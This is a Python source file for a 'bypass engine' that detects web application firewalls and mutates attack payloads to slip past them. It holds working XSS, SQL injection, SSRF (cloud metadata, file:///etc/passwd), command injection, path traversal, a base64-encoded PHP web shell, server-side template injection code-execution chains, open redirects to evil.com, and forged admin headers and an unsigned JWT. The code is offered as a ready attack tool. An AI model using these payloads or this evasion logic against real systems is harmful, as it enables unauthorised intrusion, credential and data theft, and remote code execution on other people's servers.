"""
Creative Bypass Engine — Adaptive WAF evasion and payload mutation.

When a target has defenses (WAF, rate limiting, input filtering), this module
generates creative bypass payloads using encoding tricks, mutation techniques,
and alternative approaches to find what gets through.
"""

import itertools
import random
import string
from typing import List, Dict, Optional
from urllib.parse import quote, unquote


class BypassEngine:
    """
    Creative bypass engine that mutates payloads to evade WAFs and filters.

    Strategy:
    1. Detect if a WAF is present (by analyzing response patterns)
    2. Generate mutated versions of blocked payloads
    3. Use encoding tricks (URL, HTML entity, Unicode, base64, double encoding)
    4. Apply case manipulation and comment injection
    5. Try alternative delivery methods (POST vs GET, headers vs body)
    """

    def __init__(self):
        self.waf_detected = False
        self.waf_type = ""
        self.blocked_patterns = []

    # ─── WAF Detection ───────────────────────────────────────────

    def detect_waf(self, response_body: str, response_headers: dict, status: int) -> dict:
        """Analyze response to detect WAF presence and type."""
        body_lower = response_body.lower()
        headers = {k.lower(): v.lower() for k, v in response_headers.items()}

        waf_signatures = {
            "cloudflare": ["cloudflare", "cf-ray", "__cfduid"],
            "akamai": ["akamai", "akamai-ghost", "x-akamai"],
            "aws-waf": ["aws", "x-amzn-requestid", "waf"],
            "imperva": ["imperva", "incapsula", "x-iinfo"],
            "sucuri": ["sucuri", "x-sucuri"],
            "barracuda": ["barracuda", "x-barracuda"],
            "f5": ["f5", "bigip", "x-wa-info"],
            "mod_security": ["mod_security", "modsecurity", "apache"],
            "wordfence": ["wordfence", "wf_"],
            "datadome": ["datadome", "x-dd"],
        }

        detected = []
        for waf_name, sigs in waf_signatures.items():
            for sig in sigs:
                if sig in body_lower or any(sig in v for v in headers.values()):
                    detected.append(waf_name)
                    break

        is_blocked = status in (403, 406, 429, 501) or "blocked" in body_lower or "forbidden" in body_lower
        has_challenge = "challenge" in body_lower or "captcha" in body_lower or "jschallenge" in body_lower

        if detected:
            self.waf_detected = True
            self.waf_type = detected[0]

        return {
            "waf_detected": bool(detected),
            "waf_types": detected,
            "is_blocked": is_blocked,
            "has_challenge": has_challenge,
            "status": status,
        }

    # ─── Encoding Bypasses ───────────────────────────────────────

    @staticmethod
    def url_encode(payload: str, double: bool = False) -> str:
        encoded = quote(payload)
        if double:
            encoded = quote(encoded)
        return encoded

    @staticmethod
    def html_encode(payload: str) -> str:
        return "".join(f"&#{ord(c)};" for c in payload)

    @staticmethod
    def unicode_encode(payload: str) -> str:
        return "".join(f"\\u{ord(c):04x}" for c in payload)

    @staticmethod
    def double_url_encode(payload: str) -> str:
        return quote(quote(payload))

    @staticmethod
    def mixed_encode(payload: str) -> str:
        """Mix encoding — URL encode some chars, HTML encode others."""
        result = []
        for i, c in enumerate(payload):
            if i % 3 == 0:
                result.append(f"&#ord({ord(c)});")
            elif i % 3 == 1:
                result.append(f"%{ord(c):02x}")
            else:
                result.append(c)
        return "".join(result)

    @staticmethod
    def null_byte_inject(payload: str) -> List[str]:
        """Inject null bytes at various positions."""
        variants = []
        for i in range(len(payload) + 1):
            variants.append(payload[:i] + "%00" + payload[i:])
            variants.append(payload[:i] + "\x00" + payload[i:])
        return variants[:6]

    @staticmethod
    def case_variants(payload: str) -> List[str]:
        """Generate case-mixed variants of the payload."""
        variants = set()
        variants.add(payload.lower())
        variants.add(payload.upper())
        variants.add(payload.swapcase())
        # Random case mix
        for _ in range(3):
            mixed = ""
            for c in payload:
                if c.isalpha():
                    mixed += c.upper() if random.random() > 0.5 else c.lower()
                else:
                    mixed += c
            variants.add(mixed)
        return list(variants)

    @staticmethod
    def comment_inject(payload: str) -> List[str]:
        """Inject SQL/HTML comments into the payload."""
        comments = ["/**/", "/*", "*/", "#", "--", "%0a", "%0d%0a"]
        variants = []
        for comment in comments:
            for i in range(1, len(payload)):
                variants.append(payload[:i] + comment + payload[i:])
        return variants[:8]

    # ─── Payload Mutations ───────────────────────────────────────

    def mutate_xss(self, payload: str) -> List[str]:
        """Generate WAF-bypass XSS variants."""
        variants = []

        # 1. HTML entity encoding
        variants.append(f"<script>alert&#40;1&#41;</script>")
        variants.append(self.html_encode(payload))

        # 2. Case manipulation
        variants.extend(self.case_variants(payload))

        # 3. Null byte injection
        variants.extend(self.null_byte_inject(payload))

        # 4. Comment injection in tags
        variants.append(f"<scr<!-- -->ipt>alert(1)</scr<!-- -->ipt>")
        variants.append(f"<scrip/**/t>alert(1)</scrip/**/t>")
        variants.append(f"<ScRiPt>alert(1)</ScRiPt>")

        # 5. Event handler variants
        variants.append(f'<img src=x onerror="alert(1)">')
        variants.append(f'<img src=x onerror=alert(1)>')
        variants.append(f"<svg/onload=alert(1)>")
        variants.append(f"<svg onload=alert(1)>")
        variants.append(f'<body onload="alert(1)">')
        variants.append(f"<iframe src=javascript:alert(1)>")
        variants.append(f"<details open ontoggle=alert(1)>")
        variants.append(f"<marquee onstart=alert(1)>")
        variants.append(f"<video><source onerror=alert(1)>")
        variants.append(f"<audio src=x onerror=alert(1)>")

        # 6. Encoding tricks
        variants.append(f"<script>eval(atob('YWxlcnQoMSk='))</script>")
        variants.append(f"<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>")
        variants.append(f"<script>eval('\\x61\\x6c\\x65\\x72\\x74\\x28\\x31\\x29')</script>")

        # 7. Polyglot payloads
        variants.append("jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert(1) )//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert(1)//>\\x3e")

        # 8. Without parentheses
        variants.append("<script>alert`1`</script>")
        variants.append("<script>onerror=alert;throw 1</script>")
        variants.append("<script>onerror=alert;throw'1'</script>")

        # 9. Template literal injection
        variants.append("{{constructor.constructor('alert(1)')()}}")
        variants.append("${alert(1)}")
        variants.append("#{alert(1)}")

        return list(set(variants))

    def mutate_sqli(self, payload: str) -> List[str]:
        """Generate WAF-bypass SQLi variants."""
        variants = []

        # 1. Comment injection
        variants.extend(self.comment_inject(payload))

        # 2. URL encoding
        variants.append(self.url_encode(payload))
        variants.append(self.double_url_encode(payload))

        # 3. Case manipulation for keywords
        sql_keywords = ["OR", "AND", "UNION", "SELECT", "FROM", "WHERE", "INSERT", "UPDATE", "DELETE", "DROP"]
        modified = payload
        for kw in sql_keywords:
            if kw in payload.upper():
                # Random case
                mixed = ""
                for c in kw:
                    mixed += c.upper() if random.random() > 0.5 else c.lower()
                modified = modified.replace(kw, mixed)
                modified = modified.replace(kw.lower(), mixed)
                modified = modified.replace(kw.upper(), mixed)
        variants.append(modified)

        # 4. Alternative comment styles
        variants.append(payload.replace(" ", "/**/"))
        variants.append(payload.replace(" ", "%0a"))
        variants.append(payload.replace(" ", "%0d%0a"))
        variants.append(payload.replace(" ", "\t"))

        # 5. Null byte injection
        variants.extend(self.null_byte_inject(payload))

        # 6. Alternative quote styles
        if "'" in payload:
            variants.append(payload.replace("'", "''"))
            variants.append(payload.replace("'", "\\"))
            variants.append(payload.replace("'", "0x27"))
            variants.append(self.url_encode(payload.replace("'", "''")))

        # 7. Time-based blind variants
        if "SLEEP" not in payload.upper() and "WAITFOR" not in payload.upper() and "BENCHMARK" not in payload.upper():
            variants.append("1' AND SLEEP(5)--")
            variants.append("1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--")
            variants.append("1'; WAITFOR DELAY '0:0:5'--")
            variants.append("1' AND BENCHMARK(5000000,SHA1('test'))--")

        # 8. Stacked queries
        variants.append(payload + "; SELECT 1--")
        variants.append(payload + "||SELECT 1--")

        # 9. Hex encoding
        if "admin" in payload.lower():
            variants.append(payload.replace("admin", "0x61646d696e"))

        return list(set(variants))

    def mutate_ssrf(self, payload: str) -> List[str]:
        """Generate WAF-bypass SSRF variants."""
        variants = []

        # 1. Alternative IP representations
        ip_variants = [
            "http://127.0.0.1:80",
            "http://127.1",
            "http://[::1]",
            "http://0x7f000001",
            "http://2130706433",
            "http://0177.0.0.1",
            "http://127.0.0.1.nip.io",
            "http://127.0.0.1.sslip.io",
            "http://localtest.me",
            "http://spoofed.burpcollaborator.net",
            "http://127.0.0.1%2523@evil.com",
            "http://evil.com@127.0.0.1",
            "http://127.0.0.1:80@evil.com",
        ]
        variants.extend(ip_variants)

        # 2. Schema variations
        variants.append("file:///etc/passwd")
        variants.append("dict://127.0.0.1:6379/info")
        variants.append("gopher://127.0.0.1:6379/_info")
        variants.append("tftp://127.0.0.1:69/test")
        variants.append("jar:http://127.0.0.1/!/test")

        # 3. DNS rebinding candidates
        variants.append("http://0.0.0.0")
        variants.append("http://localhost.localdomain")
        variants.append("http://127.0.0.1.sslip.io")
        variants.append("http://1u.ms")

        # 4. Cloud metadata
        variants.append("http://169.254.169.254/latest/meta-data/")
        variants.append("http://metadata.google.internal/computeMetadata/v1/")
        variants.append("http://100.100.100.200/latest/meta-data/")
        variants.append("http://fd00::254:254:254:254/latest/meta-data/")

        # 5. URL encoding
        variants.append(self.url_encode("http://127.0.0.1"))
        variants.append(self.double_url_encode("http://127.0.0.1"))

        return list(set(variants))

    def mutate_command_injection(self, payload: str) -> List[str]:
        """Generate WAF-bypass command injection variants."""
        variants = []

        separators = [";", "|", "||", "&&", "&", "`", "$(", "\n", "%0a", "%0d%0a"]
        commands = ["id", "whoami", "ls", "cat /etc/passwd", "uname -a"]

        for sep in separators:
            for cmd in commands[:2]:
                variants.append(f"{sep} {cmd}")
                variants.append(f" {sep}{cmd}")
                variants.append(f"{sep}{cmd} ")

        # 1. Alternative encodings
        for cmd in ["id", "whoami"]:
            hex_cmd = cmd.encode().hex()
            variants.append(f"\\x{hex_cmd}")
            variants.append(f"${{{chr(0x24)}({cmd})}}")

        # 2. Wildcard bypass
        variants.append("/???/??t /???/p??s??")
        variants.append("/???/c?t /etc/passwd")
        variants.append("{,/???}/??t /etc/passwd")

        # 3. Variable expansion
        variants.append("${IFS}id")
        variants.append("$@id")
        variants.append("$(id)")
        variants.append("`id`")

        return list(set(variants))

    def mutate_lfi(self, payload: str) -> List[str]:
        """Generate WAF-bypass LFI variants."""
        variants = []

        # 1. Double encoding
        variants.append(self.double_url_encode("../../../etc/passwd"))
        variants.append(self.url_encode("../../../etc/passwd"))

        # 2. Null byte injection
        variants.append("../../../etc/passwd%00")
        variants.append("../../../etc/passwd%00.html")

        # 3. Path truncation
        variants.append("/etc/passwd")
        variants.append("....//....//....//etc/passwd")
        variants.append("..;/..;/..;/etc/passwd")
        variants.append("..%252f..%252f..%252fetc/passwd")

        # 4. PHP wrappers
        variants.append("php://filter/convert.base64-encode/resource=index.php")
        variants.append("php://input")
        variants.append("php://fd/3")
        variants.append("data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUW2NdKTs=")
        variants.append("expect://id")
        variants.append("zip:///tmp/test.zip#test.php")

        # 5. Windows paths
        variants.append("../../../Windows/System32/drivers/etc/hosts")
        variants.append("..\\..\\..\\Windows\\System32\\drivers\\etc\\hosts")

        return list(set(variants))

    def mutate_ssti(self, payload: str) -> List[str]:
        """Generate WAF-bypass SSTI variants."""
        variants = []

        # 1. Template engine specific
        variants.extend([
            "{{7*7}}",
            "${7*7}",
            "#{7*7}",
            "*{7*7}",
            "<%= 7*7 %>",
            "{{config}}",
            "{{''.__class__.__mro__[2].__subclasses__()}}",
            "${T(java.lang.Runtime).getRuntime().exec('id')}",
            "#set($x=7*7)$x",
            "{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}",
            "${'7'*7}",
            "#{7*7}",
        ])

        # 2. Encoding
        variants.append(self.url_encode("{{7*7}}"))
        variants.append(self.url_encode("${7*7}"))

        # 3. Alternative syntax
        variants.extend([
            "{{7*'7'}}",
            "{{config.items()}}",
            "{{request.application.__self__._get_data_for_json.__globals__['os'].popen('id').read()}}",
            "{{().__class__.__bases__[0].__subclasses__()}}",
        ])

        return list(set(variants))

    def mutate_open_redirect(self, payload: str) -> List[str]:
        """Generate WAF-bypass open redirect variants."""
        variants = []

        variants.extend([
            "//evil.com",
            "///evil.com",
            "////evil.com",
            "https://evil.com",
            "http://evil.com",
            "/\\evil.com",
            "/\\/evil.com",
            "///\\evil.com",
            "//evil.com%2F.example.com",
            "//evil.com@example.com",
            "https://evil.com%23.example.com",
            "data:text/html,<script>alert(1)</script>",
            "javascript:alert(1)",
            "//evil%0a.com",
            "//evil%0d.com",
        ])

        # URL encoding
        variants.append(self.url_encode("//evil.com"))
        variants.append(self.double_url_encode("//evil.com"))

        return list(set(variants))

    def mutate_auth_bypass(self, headers: dict) -> List[dict]:
        """Generate WAF-bypass auth header variants."""
        bypass_headers = []

        header_payloads = [
            {"X-Forwarded-For": "127.0.0.1"},
            {"X-Forwarded-For": "127.0.0.1, 10.0.0.1"},
            {"X-Forwarded-Host": "127.0.0.1"},
            {"X-Original-URL": "/admin"},
            {"X-Rewrite-URL": "/admin"},
            {"X-Real-IP": "127.0.0.1"},
            {"X-Client-IP": "127.0.0.1"},
            {"X-Remote-Addr": "127.0.0.1"},
            {"X-Admin": "true"},
            {"X-Debug": "true"},
            {"X-Custom-IP-Authorization": "127.0.0.1"},
            {"X-Original-URL": "/admin"},
            {"X-HTTP-Method-Override": "GET"},
            {"X-HTTP-Method": "DELETE"},
            {"X-Method-Override": "GET"},
            {"Forwarded": "for=127.0.0.1;by=127.0.0.1;host=127.0.0.1"},
            {"X-Host": "127.0.0.1"},
            {"X-ProxyUser": "admin"},
            {"X-Authenticated-User": "admin"},
            {"Authorization": "Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJyb2xlIjoiYWRtaW4ifQ."},
        ]

        for h in header_payloads:
            merged = dict(headers)
            merged.update(h)
            bypass_headers.append(merged)

        return bypass_headers

    # ─── Adaptive Strategy ───────────────────────────────────────

    def generate_bypass_payloads(
        self,
        vuln_type: str,
        original_payload: str,
        waf_info: dict = None,
    ) -> List[str]:
        """
        Generate adaptive bypass payloads based on the vulnerability type
        and detected WAF information.
        """
        mutations = {
            "xss": self.mutate_xss,
            "sqli": self.mutate_sqli,
            "ssrf": self.mutate_ssrf,
            "command_injection": self.mutate_command_injection,
            "lfi": self.mutate_lfi,
            "ssti": self.mutate_ssti,
            "open_redirect": self.mutate_open_redirect,
        }

        mutator = mutations.get(vuln_type)
        if not mutator:
            return [original_payload]

        variants = mutator(original_payload)

        # Add encoding variants for all types
        variants.append(self.url_encode(original_payload))
        variants.append(self.double_url_encode(original_payload))
        variants.append(self.html_encode(original_payload))

        # If WAF detected, prioritize more aggressive bypasses
        if waf_info and waf_info.get("waf_detected"):
            # Add more comment injection variants
            variants.extend(self.comment_inject(original_payload))
            # Add null byte injection
            variants.extend(self.null_byte_inject(original_payload))

        return list(set(variants))

    def get_encoding_bypasses(self, payload: str) -> Dict[str, str]:
        """Get all encoding variants of a payload."""
        return {
            "original": payload,
            "url_encoded": self.url_encode(payload),
            "double_url_encoded": self.double_url_encode(payload),
            "html_encoded": self.html_encode(payload),
            "unicode_encoded": self.unicode_encode(payload),
            "mixed_encoded": self.mixed_encode(payload),
        }
